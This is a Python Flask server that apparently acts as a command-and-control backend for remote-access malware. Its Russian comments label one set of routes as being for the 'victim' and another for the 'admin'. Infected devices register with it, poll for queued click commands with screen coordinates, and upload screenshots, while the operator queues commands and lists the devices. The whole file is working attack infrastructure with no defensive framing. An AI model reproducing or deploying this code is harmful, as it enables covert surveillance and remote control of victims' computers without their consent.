#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

# ========== Хранилище ==========
devices = {}

# ========== Маршруты для жертвы ==========

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    device_id = data.get('id')
    dev_type = data.get('type', 'pc')
    if not device_id:
        return jsonify({'ok': False}), 400
    if device_id not in devices:
        devices[device_id] = {}
    devices[device_id].update({
        'deviceType': dev_type,
        'last_seen': datetime.now().isoformat(),
        'online': True,
        'screen': None,
        'cmd': None,
        'cmd_x': 0,
        'cmd_y': 0
    })
    return jsonify({'ok': True})

@app.route('/poll/<device_id>')
def poll(device_id):
    if device_id not in devices:
        return jsonify({'cmd': None})
    dev = devices[device_id]
    dev['last_seen'] = datetime.now().isoformat()
    dev['online'] = True
    cmd = dev.get('cmd')
    x = dev.get('cmd_x', 0)
    y = dev.get('cmd_y', 0)
    if cmd:
        dev['cmd'] = None
        return jsonify({'cmd': cmd, 'x': x, 'y': y})
    return jsonify({'cmd': None})

@app.route('/screen', methods=['POST'])
def screen():
    data = request.json
    device_id = data.get('id')
    screen_data = data.get('screen')
    if device_id not in devices:
        return jsonify({'ok': False}), 404
    devices[device_id]['screen'] = screen_data
    devices[device_id]['last_seen'] = datetime.now().isoformat()
    devices[device_id]['online'] = True
    return jsonify({'ok': True})

# ========== Маршруты для админа ==========

@app.route('/admin/add', methods=['POST'])
def admin_add():
    data = request.json
    device_id = data.get('id')
    if not device_id:
        return jsonify({'ok': False}), 400
    if device_id not in devices:
        devices[device_id] = {
            'deviceType': 'unknown',
            'last_seen': datetime.now().isoformat(),
            'online': False,
            'screen': None,
            'cmd': None,
            'cmd_x': 0,
            'cmd_y': 0
        }
    return jsonify({'ok': True})

@app.route('/cmd', methods=['POST'])
def send_cmd():
    data = request.json
    device_id = data.get('id')
    cmd = data.get('cmd')
    if device_id not in devices:
        return jsonify({'ok': False}), 404
    devices[device_id]['cmd'] = cmd
    devices[device_id]['cmd_x'] = data.get('x', 0)
    devices[device_id]['cmd_y'] = data.get('y', 0)
    return jsonify({'ok': True})

@app.route('/devices')
def list_devices():
    clean = {}
    now = datetime.now()
    for k, v in devices.items():
        if v.get('last_seen'):
            try:
                last = datetime.fromisoformat(v['last_seen'])
                if (now - last).seconds > 60:
                    v['online'] = False
            except:
                pass
        clean[k] = {key: val for key, val in v.items() if key not in ['cmd', 'cmd_x', 'cmd_y']}
    return jsonify(clean)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
